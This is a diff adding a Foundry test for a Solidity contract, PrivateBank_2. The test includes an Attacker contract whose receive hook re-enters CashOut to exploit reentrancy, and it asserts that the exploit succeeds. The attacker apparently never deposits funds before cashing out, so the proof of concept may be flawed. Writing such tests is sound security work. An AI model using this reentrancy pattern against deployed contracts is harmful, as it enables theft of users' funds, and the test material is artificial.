@@ -1,0 +1,67 @@
+
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.29;
+
+import {Test} from "../lib/forge-std/src/Test.sol";
+import "../src/PrivateBank_2.sol";
+
+contract TestReentrancyPrivateBank_2 is Test {
+
+    PrivateBank_2 public _contractUnderTest;
+
+    Attacker public _attacker;
+
+    function setUp() public {
+        _contractUnderTest = new PrivateBank_2(address(0));
+        _attacker = new Attacker(address(_contractUnderTest));
+    }
+
+    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
+        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
+
+        vm.deal(address(_contractUnderTest), attackVal * 2);
+        vm.deal(address(_attacker), attackVal * 2);
+        vm.deal(address(this), attackVal * 2);
+
+        _contractUnderTest.Deposit{value: attackVal}();
+        _attacker.setupAttack{value: attackVal}(attackVal);
+        _attacker.attack(attackVal);
+
+        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
+    }
+
+    receive() external payable {}
+}
+
+contract Attacker {
+    PrivateBank_2 public victim;
+    uint256 public attackCallCount;
+    bool public exploitSucceeded;
+    uint256 public initialBalance;
+
+    constructor(address victimAddress) {
+        victim = PrivateBank_2(victimAddress);
+    }
+
+    function setupAttack(uint256 val) public payable {
+        attackCallCount = 1;
+        exploitSucceeded = false;
+    }
+
+    function attack(uint256 val) public {
+        initialBalance = address(this).balance;
+
+        victim.CashOut(val);
+
+        if (address(this).balance > initialBalance) {
+            exploitSucceeded = true;
+        }
+    }
+
+    receive() external payable {
+        if (attackCallCount < 2) {
+            victim.CashOut(1 ether);
+            attackCallCount++;
+        }
+    }
+}
